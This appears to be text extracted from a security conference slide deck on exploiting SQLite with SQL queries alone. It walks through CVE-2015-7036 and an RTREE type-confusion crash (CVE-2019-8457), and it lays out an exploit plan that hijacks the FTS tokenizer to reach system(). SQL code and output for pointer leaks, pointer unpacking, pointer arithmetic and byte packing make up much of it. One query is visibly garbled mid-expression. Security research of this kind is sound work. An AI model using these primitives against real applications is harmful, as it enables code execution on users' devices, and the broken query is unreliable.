db.transaction(function (tx) {  
   tx.executeSql('CREATE TABLE IF NOT EXISTS LOGS (id unique, log)');  
   tx.executeSql('INSERT INTO LOGS (id, log) VALUES (1, "foobar")');  
   tx.executeSql('INSERT INTO LOGS (id, log) VALUES (2, "logmsg")');  
}); 
WebSQL For Attackers
•
Untrusted input into SQLite 
•
Reachable from any website 
•
A couple of the world’s most popular browsers 
•
Bugs could be leveraged with the comfort of a Javascript interpreter 
WebSQL - Attacks
•
Several impressive researches have been published 
•
From low hanging fruits like CVE-2015-7036  
-
untrusted pointer dereference fts3_tokenizer() 
•
To more complex exploits presented in Blackhat 2017 by  Chaitin 
-
Type confusion in fts3OptimizeFunc() 
•
And the recent Magellan bugs found by Tencent 
-
Integer overflow in fts3SegReaderNext() 
FTS?
Full Text Search
•
Virtual table module 
•
Textual searches on a set of documents
“Like Google for your SQLite database”
Virtual Tables
•
Plenty of cool functionalities: FTS, RTREE, CSV 
•
From the perspective of an SQL statement, the virtual table object looks like 
any other table or view  
•
Behind the scenes, dark magic happens 
-
Queries and updates invoke callback methods on shadow tables
Shadow Tables
CREATE VIRTUAL TABLE vt USING FTS3 (content TEXT);
INSERT INTO vt VALUES('Hello world');
vt_content
vt_segdir
vt_segments
Raw text
Metadata
Shadow Tables
RTREE Bug
•
RTREE virtual table 
•
Compiled with SQLite in MacOS, iOS and Windows 10 
•
Geographical indexing
CREATE VIRTUAL TABLE demo_index USING rtree( 
   id, --integer 
   X, 
   Y 
);
•
So RTREE interfaces would expect id to be an integer
CREATE VIRTUAL TABLE vt USING RTREE(id, X, Y); 
INSERT INTO vt VALUES('Definitely not an int', 1, 2); 
SELECT rtreenode(2, id) FROM vt;
Now Also Available In Windows 
10: CVE-2019-8457
Scriptless Exploitation?
•
Virtual tables has bugs 
•
Using query hijacking we can trigger them at the C2 and cause a SEGFAULT 
•
Gaining flow control requires some form of scripting 
•
We don’t have JS 
•
We vaguely recall hearing somewhere that SQL is turing complete
My Exploitation Primitives  
Wish-list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Exploitation With Pure SQL
Query Oriented Programming © 
QOP by Example:                      
The Unfixed CVE-2015-7036
•
WAT? How come a 4 year old bug is still unfixed 
-
It was only ever considered dangerous in the context of untrusted webSQL  
•
blacklisted unless compiled with ENABLE_FTS_TOKENIZER 
•
Still vulnerable:  
-
PHP5 
-
PHP7  
-
iOS  
-
MacOS 
-
…
CVE-2015-7036
•
A Tokenizer is a set of rules for extracting terms from a document or a query. 
•
The default Tokenizer “simple” just splits strings by whitespaces 
•
Custom tokenizers can be registered with fts3_tokenizer() in an SQL query
CVE-2015-7036
•
fts3_tokenizer() is an overloaded function:
sqlite> SELECT fts3_tokenizer('simple'); 
??=?1V 
sqlite> SELECT hex(fts3_tokenizer('simple')); 
80A63DDB31560000
sqlite> SELECT fts3_tokenizer('simple', x'4141414141414141'); 
sqlite> CREATE VIRTUAL TABLE vt USING fts3 (content TEXT); 
Segmentation fault
RECAP
•
SQLite is a wonderful one-shot for many targets 
•
Complex machine written in C 
•
Query Hijacking can trigger bugs  
•
We aim to write a full exploit implementing all necessary primitives with SQL 
queries
Exploitation Game Plan
•
Leak some pointers 
•
Calculate functions addresses 
•
Create a fake tokenizer object with some pointers to system() 
•
Spray fake tokenizer 
•
Override the default tokenizer function pointer 
•
Trigger our malicious tokenizer 
•
??? 
•
Grab your grandma’s Yahoo password
Memory Leak
sqlite3> SELECT SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -2, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -4, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -6, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -8, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -10, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -12, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -14, 2)||  
                SUBSTR((SELECT hex(fts3_tokenizer('simple'))), -16, 2); 
+-----------------------------------------------------------------+ 
| 00007F3D3254A8E0                                                | 
+-----------------------------------------------------------------+
sqlite3> CREATE VIRTUAL TABLE vt USING FTS3(content TEXT); 
sqlite3> INSERT INTO vt values('some text'); 
sqlite3> SELECT hex(vt) FROM vt WHERE content MATCH 'text'; 
+---------------------+ 
|  08C453FF88550000   | 
+---------------------+
•
Libsqlite leak
•
Heap leak
My Exploitation Primitives Wish-
list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Pseudo-variables
•
Unlike browser WebSQL exploitation, no JS variables and arrays to use 
•
We can only CREATE TABLE || VIEW || INDEX || TRIGGER 
•
Chaining VIEWs together we can use them as pseudo-variables 
sqlite3> CREATE VIEW le_leak AS SELECT hex(fts3_tokenizer("simple")) AS col; 
sqlite3> CREATE VIEW leak AS SELECT SUBSTR((SELECT col FROM le_leak), -2, 2)||  
                SUBSTR((SELECT col FROM le_leak), -4, 2)||  
                SUBSTR((SELECT col FROM le_leak), -6, 2)||  
                SUBSTR((SELECT col FROM le_leak), -8, 2)||  
                SUBSTR((SELECT col FROM le_leak), -10, 2)||  
                SUBSTR((SELECT col FROM le_leak), -12, 2)||  
                SUBSTR((SELECT col FROM le_leak), -14, 2)||  
                SUBSTR((SELECT col FROM le_leak), -16, 2) AS col; 
sqlite3> SELECT col FROM leak; 
+------------------+ 
| 00007F3D3254A8E0 | 
+------------------+
Unpacking of 64-bit pointers
•
To calculate the base of an image or the heap we have to convert our 
pointers to integers
sqlite3> CREATE VIEW u64_leak AS SELECT (  
             (SELECT ((instr("0123456789ABCDEF", substr((SELECT col FROM leak), -1,  1)) -1) * (1  SELECT col FROM u64_leak; 
+-----------------+ 
| 139900814141664 | 
+-----------------+
My Exploitation Primitives Wish-
list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Pointer Arithmetics
•
With integers at hand pointer arithmetics is simple
sqlite3> CREATE VIEW u64_libsqlite_base AS SELECT (  
                 (SELECT col FROM u64_leak ) - ( SELECT ‘3164384') 
                 ) as col; 
sqlite3> SELECT col FROM u64_libsqlite_base; 
+-----------------+ 
| 140713244319744 | 
+-----------------+
My Exploitation Primitives Wish-
list
•
Leaking memory 
•
Unpacking of 64-bit pointers 
•
Pointer arithmetics 
•
Packing of 64-bit pointers 
•
Crafting complex fake objects in memory 
•
Heap Spray
Packing of 64-bit pointers
•
Write back manipulated pointers 
•
char()
sqlite3> SELECT char(0x41); 
+------------+ 
| A          | 
+------------+ 
sqlite3> SELECT hex(char(0x41)); 
+-----------------+ 
| 41              | 
+-----------------+ 
sqlite3> SELECT char(0xFF); 
+------------+ 
| ÿ          | 
+------------+ 